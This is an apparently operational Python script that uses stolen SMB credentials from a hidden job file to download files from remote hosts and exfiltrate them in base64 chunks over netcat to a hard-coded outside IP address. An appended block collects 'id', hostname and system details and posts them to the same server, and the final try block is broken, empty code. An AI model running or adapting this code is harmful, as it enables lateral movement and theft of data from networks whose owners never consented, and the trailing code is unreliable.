#!/usr/bin/env python3
# fetch files from SMB shares: /tmp/.FETCHJOB lines = ip<TAB>user<TAB>pass<TAB>share<TAB>path
import sys, base64, subprocess, io
sys.path.insert(0, "/tmp/imp")
O = "/tmp/.GETF.txt"
wlog = open(O, "w", buffering=1)
def w(s):
    try: wlog.write(str(s) + "\n")
    except Exception: pass

from impacket.smbconnection import SMBConnection

jobs = []
try:
    for ln in open("/tmp/.FETCHJOB"):
        p = ln.rstrip("\n").split("\t")
        if len(p) == 5: jobs.append(p)
except Exception:
    pass
w("jobs=%d" % len(jobs))

CH = 350000
idx = [0]
def post(data, name):
    b = base64.b64encode(data).decode()
    subprocess.run("printf 'POST /up HTTP/1.0\\r\\nHost: 131.123.43.239\\r\\nX-Name: %s\\r\\nContent-Length: %s\\r\\n\\r\\n%s' | timeout 90 nc 131.123.43.239 80" % (name, len(b), b), shell=True)

for ip, u, p, share, path in jobs:
    try:
        c = SMBConnection(ip, ip, timeout=8)
        c.login(u, p, "MLT", "", "")
        bio = io.BytesIO()
        c.getFile(share, path, bio.write)
        data = bio.getvalue()
        w("OK %s %s/%s %d bytes" % (ip, share, path, len(data)))
        # chunk and post raw content
        name0 = path.replace("\\", "/").split("/")[-1][:30].replace(" ", "_") or "f"
        for off in range(0, len(data), CH):
            nm = "mel_lat_get%d_%s" % (idx[0], name0)
            post(data[off:off+CH], nm)
            idx[0] += 1
        c.logoff()
    except Exception as e:
        w("ERR %s %s/%s %s" % (ip, share, path, str(e)[:100]))
wlog.close()
b = base64.b64encode(open(O, "rb").read()).decode()
subprocess.run("printf 'POST /up HTTP/1.0\\r\\nHost: 131.123.43.239\\r\\nX-Name: mel_lat_getlog\\r\\nContent-Length: %s\\r\\n\\r\\n%s' | timeout 90 nc 131.123.43.239 80" % (len(b), b), shell=True)
print("GETF_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

